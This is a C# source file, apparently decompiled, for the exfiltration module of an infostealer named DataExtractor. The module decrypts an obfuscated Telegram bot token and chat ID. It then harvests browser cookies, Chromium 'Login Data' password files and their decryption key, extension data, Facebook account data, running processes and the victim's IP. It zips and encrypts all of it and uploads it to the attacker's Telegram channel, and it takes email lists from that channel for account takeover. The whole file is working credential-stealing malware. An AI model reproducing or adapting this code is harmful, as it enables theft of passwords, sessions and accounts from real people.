using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using DataExtractor.Core.Models.Browsers.Childs;
using DataExtractor.Core.Utils;
using Newtonsoft.Json;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;

namespace DataExtractor.Core.Handlers;

public class TelegramHandler
{
	private readonly string _id = "";

	private readonly string _apiKey = "";

	private StringBuilder _stringBuilder = new StringBuilder();

	private TelegramBotClient _telegramBotClient;

	private readonly ChatId _chatId;

	private readonly string _version = "19";

	private string _guidId = "data_" + Guid.NewGuid().ToString();

	private string _message;

	public List<string> Emails { get; private set; }

	public string Version => _version;

	public TelegramHandler()
	{
		_telegramBotClient = new TelegramBotClient(Change(_apiKey));
		_chatId = new ChatId(Convert.ToInt64(Change(_id)));
	}

	private string Change(string text)
	{
		byte[] rgbKey = new byte[8] { 91, 243, 81, 87, 209, 2, 227, 33 };
		byte[] rgbIV = new byte[8] { 233, 135, 121, 18, 227, 114, 89, 58 };
		SymmetricAlgorithm symmetricAlgorithm = DES.Create();
		ICryptoTransform cryptoTransform = symmetricAlgorithm.CreateDecryptor(rgbKey, rgbIV);
		byte[] array = Convert.FromBase64String(text);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.Unicode.GetString(bytes);
	}

	public bool? Connect(ConfigData configData)
	{
		if (!string.IsNullOrEmpty(configData.GuidId))
		{
			_guidId = configData.GuidId ?? "";
		}
		else
		{
			configData.GuidId = _guidId;
		}
		_telegramBotClient.StartReceiving();
		_telegramBotClient.OnUpdate += telegramBotClient_OnUpdate;
		while (true)
		{
			try
			{
				_telegramBotClient.SendTextMessageAsync(_chatId, _guidId).Wait();
			}
			catch
			{
				Thread.Sleep(TimeSpan.FromSeconds(10.0));
				continue;
			}
			break;
		}
		try
		{
			double num = 180.0;
			while (string.IsNullOrEmpty(_message) && num > 0.0)
			{
				Thread.Sleep(TimeSpan.FromMilliseconds(500.0));
				num -= 0.5;
			}
			if (num == 0.0)
			{
				Log("Force run");
				Emails = GenRandomList();
			}
			return true;
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			_telegramBotClient.StopReceiving();
			_telegramBotClient.OnUpdate -= telegramBotClient_OnUpdate;
		}
	}

	private List<string> GenRandomList()
	{
		return new List<string> { "joinlasien.facebook@gmail.com", "jessicca.facebook@gmail.com", "chrisjamees.facebook@gmail.com", "thomsonemily.facebook@gmail.com", "stephendanny.facebook@gmail.com", "erichenderson.facebook@gmail.com", "albertandrew.facebook@gmail.com", "buttjerry.facebook@gmail.com", "louisnathan.facebook@gmail.com" };
	}

	internal List<string> NeedNewEmail()
	{
		_message = null;
		_telegramBotClient.StartReceiving();
		_telegramBotClient.OnUpdate += telegramBotClient_OnUpdate;
		while (true)
		{
			try
			{
				_telegramBotClient.SendTextMessageAsync(_chatId, _guidId).Wait();
			}
			catch
			{
				Thread.Sleep(TimeSpan.FromSeconds(10.0));
				continue;
			}
			break;
		}
		try
		{
			double num = 180.0;
			while (string.IsNullOrEmpty(_message) && num > 0.0)
			{
				Thread.Sleep(TimeSpan.FromMilliseconds(500.0));
				num -= 0.5;
			}
			if (num == 0.0)
			{
				Log("Force run");
				return null;
			}
			return Emails;
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			_telegramBotClient.StopReceiving();
			_telegramBotClient.OnUpdate -= telegramBotClient_OnUpdate;
		}
	}

	internal string RandomEmail(IEnumerable<string> allEmailShare)
	{
		if (Emails.Count < 5)
		{
			NeedNewEmail();
		}
		if (Emails.Count == 0)
		{
			return null;
		}
		string email = Emails[RandomUtils.RandomNumber(0, Emails.Count - 1)];
		int num = 5;
		while (num-- > 0 && allEmailShare.FirstOrDefault((string a) => a.Contains(email)) != null && Emails.Count > 1)
		{
			email = Emails[RandomUtils.RandomNumber(0, Emails.Count - 1)];
		}
		if (allEmailShare.FirstOrDefault((string a) => a.Contains(email)) != null)
		{
			return null;
		}
		return email;
	}

	public void SendFile()
	{
		byte[] buffer = System.IO.File.ReadAllBytes("100000458192217.zip");
		using MemoryStream content = new MemoryStream(buffer);
		_telegramBotClient.SendDocumentAsync(_chatId, new InputOnlineFile(content)
		{
			FileName = "100000458192217.zip"
		}, null, "key:SKm0uJdd20cu49Ket5rFLOXA48baFog98j6qo3wa2Cszi9gNOhPV55cvlKxqUiJC5d0mE74VIXEKkk+zXKAgIE88Is/ljTQE9MVTrD6ZarpyHiU4lNgBQrJC87Xvf0ja+1bKrbTeCB6jwj4Jq180+KAd5ZJEuo7Y/TOsT0KFMas=").Wait();
	}

	internal void Send(ConfigData configData)
	{
		_stringBuilder.AppendLine("\n\n\nProcess list ------\n\n");
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			_stringBuilder.AppendLine(process.ProcessName);
		}
		if (configData.Ip != null)
		{
			_stringBuilder.AppendLine($"Ip : {configData.Ip}");
		}
		else
		{
			_stringBuilder.Append("No IP found");
		}
		_stringBuilder.AppendLine("Version : " + _version);
		using MemoryStream memoryStream = new MemoryStream();
		using (ZipArchive zipArchive = new ZipArchive(memoryStream, ZipArchiveMode.Create, leaveOpen: true))
		{
			WriteFile(zipArchive, Encoding.UTF8.GetBytes(_stringBuilder.ToString()), "log.txt");
			int num = 1;
			int num2 = 1;
			foreach (IGrouping<string, BrowserProfile> item in from a in configData.BrowserProfiles
				group a by a.MyBrowser.UserAgent)
			{
				if (!string.IsNullOrEmpty(item.Key))
				{
					WriteFile(zipArchive, Encoding.UTF8.GetBytes(item.Key), $"{num2}/user_agent.txt");
				}
				foreach (BrowserProfile item2 in item)
				{
					WriteDataFile(zipArchive, item2, Path.Combine(num2.ToString(), Guid.NewGuid().ToString().Replace("-", "") ?? ""));
				}
				num++;
				num2++;
			}
			num = 1;
			foreach (BrowserProfile browserProfile in configData.BrowserProfiles)
			{
				WriteFile(zipArchive, Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(browserProfile.Cookies)), $"cookies{num++}.txt");
			}
		}
		SendDocument(memoryStream, "Log " + _guidId + ".zip", "Log " + _guidId + " " + _version);
	}

	internal void SendDocument(MemoryStream memoryStream, string fileName, string caption, int count = 5)
	{
		byte[] data = memoryStream.ToArray();
		string key;
		byte[] buffer = EncryptHandler.Encrypt(data, caption, out key);
		using MemoryStream content = new MemoryStream(buffer);
		while (count-- > 0)
		{
			try
			{
				_telegramBotClient.SendDocumentAsync(_chatId, new InputOnlineFile(content)
				{
					FileName = fileName
				}, null, "key:" + key).Wait();
				break;
			}
			catch (Exception ex)
			{
				Log(ex.ToString());
				SleepRetry(ex);
				memoryStream.Seek(0L, SeekOrigin.Begin);
			}
		}
	}

	internal void RemoveEmail(string email)
	{
		Emails.Remove(email);
	}

	private async void telegramBotClient_OnUpdate(object sender, UpdateEventArgs e)
	{
		if (e.Update.Type != UpdateType.ChannelPost)
		{
			return;
		}
		Message message = e.Update.ChannelPost;
		Console.WriteLine(message.Text);
		if (message.Text != null && message.Text.Contains(_guidId + "_ok") && string.IsNullOrEmpty(_message))
		{
			if (message.Text.EndsWith("_ok"))
			{
				Emails = GenRandomList();
			}
			else
			{
				Emails = GetListEmail(message.Text);
			}
			_message = _guidId;
			try
			{
				await _telegramBotClient.SendTextMessageAsync(message.Chat, "ok_" + _guidId);
			}
			catch (Exception ex)
			{
				Log(ex.ToString());
				await Task.Delay(TimeSpan.FromSeconds(10.0));
			}
		}
	}

	private List<string> GetListEmail(string text)
	{
		string text2 = text.Replace(_guidId + "_ok_", "");
		List<string> list = (from a in (from a in text2.Split(new string[1] { "@" }, StringSplitOptions.None)
				where !string.IsNullOrEmpty(a)
				select a).Select(delegate(string a)
			{
				try
				{
					int num = a.IndexOf('_');
					string text3 = a.Substring(0, num);
					string text4 = a.Substring(num + 1, a.Length - 1 - num);
					return (text4 + "@" + text3).Trim();
				}
				catch
				{
					return null;
				}
			})
			where a != null
			select a).ToList();
		if (list.Count > 0)
		{
			return list;
		}
		return GenRandomList();
	}

	internal void Send(BrowserProfile profile)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using (ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, leaveOpen: true))
		{
			WriteProfile(profile, archive);
		}
		SendFile(memoryStream, profile, 3);
	}

	private void SendFile(MemoryStream memoryStream, BrowserProfile profile, int maxCount)
	{
		memoryStream.Seek(0L, SeekOrigin.Begin);
		SendDocument(memoryStream, profile.FbData.UserId + ".zip", _guidId, maxCount);
	}

	private void WriteProfile(BrowserProfile profile, ZipArchive archive)
	{
		WriteFile(archive, Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(profile.FbData)), "1.txt");
		WriteFile(archive, Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(profile.Cookies)), "2.txt");
		if (profile.FbData != null)
		{
			WriteFile(archive, Encoding.UTF8.GetBytes(profile.FbData.GetLog()), "currentLog.txt");
		}
		WriteFile(archive, Encoding.UTF8.GetBytes(_version), "version.txt");
		if (string.IsNullOrEmpty(profile.ExtensionData) || !Directory.Exists(profile.ExtensionData))
		{
			return;
		}
		string path = "exts";
		string[] directories = Directory.GetDirectories(profile.ExtensionData);
		foreach (string path2 in directories)
		{
			string path3 = Path.Combine(path, Path.GetFileName(path2));
			string[] files = Directory.GetFiles(path2);
			foreach (string filePathSave in files)
			{
				CreateEntryFromFile(path3, filePathSave, archive);
			}
		}
	}

	internal void TrySend(BrowserProfile profile)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using (ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, leaveOpen: true))
		{
			WriteProfile(profile, archive);
		}
		SendFile(memoryStream, profile, 10);
	}

	private void SleepRetry(Exception ex)
	{
		if (ex.Message.Contains("retry after"))
		{
			try
			{
				int num = Convert.ToInt32(ex.Message.CutString("retry after", ")"));
				Thread.Sleep(TimeSpan.FromSeconds(num + 1));
				return;
			}
			catch
			{
				Thread.Sleep(TimeSpan.FromSeconds(5.0));
				return;
			}
		}
		Thread.Sleep(TimeSpan.FromSeconds(5.0));
	}

	private void WriteFile(ZipArchive archive, byte[] data, string name)
	{
		ZipArchiveEntry zipArchiveEntry = archive.CreateEntry(name);
		using MemoryStream memoryStream = new MemoryStream(data);
		using Stream destination = zipArchiveEntry.Open();
		memoryStream.CopyTo(destination);
	}

	private void WriteDataFile(ZipArchive zipArchive, BrowserProfile item, string path)
	{
		try
		{
			bool flag = false;
			WriteFile(zipArchive, Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(item.Cookies)), Path.Combine(path, "cookies.txt"));
			string directoryName = Path.GetDirectoryName(item.CookiePath);
			foreach (string item2 in from a in Directory.GetFiles(directoryName)
				where Path.GetFileNameWithoutExtension(a).StartsWith("Login Data")
				select a)
			{
				flag = true;
				CreateEntryFromFile(path, item2, zipArchive);
			}
			foreach (string item3 in from a in Directory.GetFiles(Path.GetDirectoryName(directoryName))
				where Path.GetFileNameWithoutExtension(a).StartsWith("Login Data")
				select a)
			{
				flag = true;
				CreateEntryFromFile(path, item3, zipArchive);
			}
			if (!string.IsNullOrEmpty(item.ExtensionData) && Directory.Exists(item.ExtensionData))
			{
				string path2 = Path.Combine(path, "exts");
				string[] directories = Directory.GetDirectories(item.ExtensionData);
				foreach (string path3 in directories)
				{
					string path4 = Path.Combine(path2, Path.GetFileName(path3));
					string[] files = Directory.GetFiles(path3);
					foreach (string filePathSave in files)
					{
						CreateEntryFromFile(path4, filePathSave, zipArchive);
					}
				}
			}
			if (!flag)
			{
				return;
			}
			byte[] array = null;
			if (item.MyBrowser is ChromiumBrowser)
			{
				array = ((ChromiumBrowser)item.MyBrowser).GetKey();
			}
			if (array == null)
			{
				return;
			}
			using MemoryStream memoryStream = new MemoryStream(array);
			ZipArchiveEntry zipArchiveEntry = zipArchive.CreateEntry(Path.Combine(path, "key"));
			using Stream destination = zipArchiveEntry.Open();
			memoryStream.CopyTo(destination);
		}
		catch (Exception ex)
		{
			Log(ex.ToString());
		}
	}

	private void CreateEntryFromFile(string path, string filePathSave, ZipArchive zipArchive)
	{
		try
		{
			zipArchive.CreateEntryFromFile(filePathSave, Path.Combine(path, Path.GetFileName(filePathSave)));
		}
		catch (Exception)
		{
			string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString().Replace("-", "")
				.Substring(0, 6) + Path.GetExtension(filePathSave));
			try
			{
				System.IO.File.Copy(filePathSave, text, overwrite: true);
				zipArchive.CreateEntryFromFile(text, Path.Combine(path, Path.GetFileName(filePathSave)));
			}
			catch (Exception ex)
			{
				Log("Error 2 : " + ex.ToString());
			}
			finally
			{
				try
				{
					if (System.IO.File.Exists(text))
					{
						System.IO.File.Delete(text);
					}
				}
				catch (Exception ex2)
				{
					Log("Error 3 " + ex2.ToString());
				}
			}
		}
	}

	internal void Log(string msg)
	{
		Console.WriteLine(msg);
		_stringBuilder.AppendLine(msg);
	}

	private void SendError(string msg)
	{
		try
		{
			_telegramBotClient.SendTextMessageAsync(_chatId, "error : " + msg + " " + _guidId).Wait();
		}
		catch (Exception ex)
		{
			_stringBuilder.AppendLine(ex.ToString());
			SleepRetry(ex);
		}
	}

	internal void ResetLog()
	{
		_stringBuilder.Clear();
	}
}
